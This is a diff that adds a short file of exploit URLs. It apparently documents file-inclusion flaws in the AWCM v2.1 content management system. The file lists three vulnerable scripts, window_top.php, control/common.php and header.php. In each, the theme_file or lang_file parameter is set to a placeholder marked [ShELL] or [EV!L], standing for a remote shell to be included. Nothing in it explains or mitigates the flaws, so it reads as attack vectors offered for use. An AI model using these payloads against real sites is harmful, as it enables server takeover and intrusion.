@@ -1,0 +1,10 @@
+﻿
+http://www.example.com/awcm v2.1 final/awcm/includes/window_top.php?theme_file=[ShELL]
+
+http://www.example.com/awcm v2.1 final/awcm/control/common.php?lang_file=[ShELL]
+
+http://www.example.com/awcm v2.1 final/awcm/header.php?theme_file=[EV!L] 
+
+
+
+      
